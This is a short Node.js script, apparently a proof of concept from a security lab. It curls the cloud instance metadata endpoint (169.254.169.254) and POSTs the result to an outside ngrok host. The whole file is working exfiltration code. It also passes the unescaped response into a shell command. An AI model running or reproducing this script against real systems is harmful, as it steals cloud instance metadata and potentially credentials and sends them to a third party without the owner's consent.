#!/usr/bin/env node
const { exec } = require("child_process");

// Metadata target and response endpoint
const metadataUrl = "http://169.254.169.254/latest/meta-data/";
const postResponseUrl = "https://nomasec-labs.ngrok.app/response";

// Fetch metadata
exec(`curl "${metadataUrl}"`, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    process.exit(1);
  }
  if (stderr) {
    console.error(`Stderr: ${stderr}`);
  }
  console.log("Metadata Response:", stdout);

  // Return result to response endpoint
  const postData = JSON.stringify({ content: stdout });
  exec(`curl -X POST -H "Content-Type: application/json" --data '${postData}' "${postResponseUrl}"`, (err, out, errout) => {
    if (err) {
      console.error(`Error sending response: ${err.message}`);
      process.exit(1);
    }
    if (errout) {
      console.error(`Stderr from POST: ${errout}`);
    }
    console.log("Server acknowledged:", out);
  });
});
